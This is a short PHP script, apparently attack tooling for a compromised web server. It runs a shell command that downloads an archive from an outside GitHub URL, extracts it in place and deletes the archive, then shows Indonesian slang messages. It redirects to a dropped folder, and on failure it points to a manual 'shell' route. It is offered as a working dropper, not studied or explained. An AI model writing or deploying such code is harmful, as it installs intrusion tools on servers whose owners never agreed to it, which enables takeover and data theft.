<?php

echo '<font color=lime>';
if(system("wget -qO- -O tmp.tar.bz2 https://github.com/antoniola/js/blob/master/SmConf2017Ku.tar.bz2?raw=true && tar -jzxvf tmp.tar.bz2 && rm tmp.tar.bz2")) 
echo '<br> <center><b>Selaman Anda Berhasil Ngocok</center></b><meta http-equiv="refresh" content="3;URL=./HsH/"/>';
 else echo '<br><center><h1>Di disabled Sama Server <br>Harus Manual Cok<br>Coba Lewat Sini<br>Dan Buat Sehll Text Dulu</h1><a href=\'?pintu\'class=\'btn cta\'>Tusbol</a></center></b>';
echo '</font>';


?>
